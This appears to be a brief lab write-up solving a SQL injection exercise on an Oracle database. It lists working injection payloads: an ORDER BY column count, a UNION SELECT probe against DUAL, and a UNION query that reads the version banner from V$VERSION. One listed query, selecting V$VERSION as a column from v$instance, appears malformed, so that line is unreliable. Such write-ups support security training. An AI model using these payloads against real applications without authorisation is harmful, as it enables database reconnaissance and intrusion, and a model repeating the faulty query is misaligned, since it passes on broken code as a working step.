# Lab-03 Sql Injection

## SQL injection attack, querying the database type and version on Oracle

### Problems

- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.

### Solution

- Goto product category then derive the Number of table it contains using 'order by' query:`'order by 2--`

- It's 'Oracle' database so There is a built-in table on Oracle called dual
After that use 'union select' query and find which column contain text:
```sql
-- Step 1: Verify the query returns two columns
' UNION SELECT NULL, NULL FROM DUAL--

-- Step 2: Extract the Oracle database version
' UNION SELECT BANNER, NULL FROM V$VERSION--
' UNION SELECT V$VERSION,NULL FROM v$instance--
```
- Lab solved!!


